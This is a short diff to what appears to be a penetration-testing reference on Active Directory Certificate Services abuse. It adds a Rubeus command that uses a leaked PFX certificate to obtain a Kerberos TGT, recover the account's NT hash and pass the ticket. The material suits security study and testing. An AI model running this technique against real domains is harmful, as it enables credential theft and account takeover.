@@ -131,6 +131,12 @@ certutil.exe -TCAInfo
 certutil -v -dstemplate
 ```
 
+Rubeus can also use a password-protected PFX certificate for PKINIT authentication and request a TGT. The optional `/getcredentials` switch requests a U2U service ticket and attempts to recover the account NT hash:<sup>[[4]](#references)</sup>
+
+```powershell
+Rubeus.exe asktgt /user:<USER> /certificate:C:\temp\leaked.pfx /password:<PFX_PASSWORD> /getcredentials /ptt
+```
+
 ## References
 
 - [1] [Certified Pre-Owned: Abusing Active Directory Certificate Services](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)
